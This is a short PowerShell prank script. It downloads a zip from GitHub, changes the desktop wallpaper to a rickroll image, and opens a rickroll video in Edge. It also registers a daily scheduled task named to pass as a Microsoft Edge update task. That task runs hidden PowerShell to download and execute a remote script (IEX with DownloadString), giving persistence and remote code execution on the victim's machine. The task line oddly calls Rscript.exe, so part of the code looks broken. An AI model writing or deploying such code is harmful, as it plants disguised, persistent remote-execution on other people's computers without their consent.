mkdir C:\temp
   
$filename = "C:\temp\rick.zip"

#If the file does not exist, create it.
if (-not(Test-Path -Path $filename -PathType Leaf)) {
   Invoke-WebRequest 'https://github.com/CHONK12/rickRoll/archive/refs/heads/main.zip' -OutFile C:\temp\rick.zip
   Expand-Archive C:\temp\rick.zip .\rick
   
}

$MyWallpaper="C:\temp\rickroll.jpg"
$code = @'
using System.Runtime.InteropServices;
namespace Win32{

    public class Wallpaper{
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;

        public static void SetWallpaper(string thePath){
            SystemParametersInfo(20,0,thePath,3);
        }
    }
}
'@





add-type $code
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
$action = New-ScheduledTaskAction -Execute 'Rscript.exe' -Argument 'powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('https://github.com/CHONK12/rickRoll/raw/main/Blue.ps1');"' 
$trigger = New-ScheduledTaskTrigger -Daily -At 3pm
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ

Remove-Item C:\temp\rick.zip
